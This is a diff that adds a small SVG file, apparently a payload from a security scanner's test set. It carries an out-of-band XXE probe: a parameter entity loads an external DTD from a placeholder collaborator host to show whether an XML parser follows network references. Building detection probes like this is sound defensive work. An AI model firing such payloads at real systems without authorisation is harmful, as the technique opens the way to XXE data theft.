@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- XXE OOB via a PARAMETER entity that pulls an external DTD. Parameter
+     entities (%name;) are resolved inside the DTD before the document body,
+     so this fires during the DTD phase and reaches parsers that ignore general
+     entities in content. Benign: it only fetches the external DTD URL, which
+     is enough to prove the parser follows parameter-entity network references.
+     {{COLLAB}} is replaced per-send with a unique host/marker. -->
+<!DOCTYPE svg [
+  <!ENTITY % ext SYSTEM "http://{{COLLAB}}/svg_xxe_param.dtd">
+  %ext;
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">
+  <text x="0" y="20">pe</text>
+</svg>
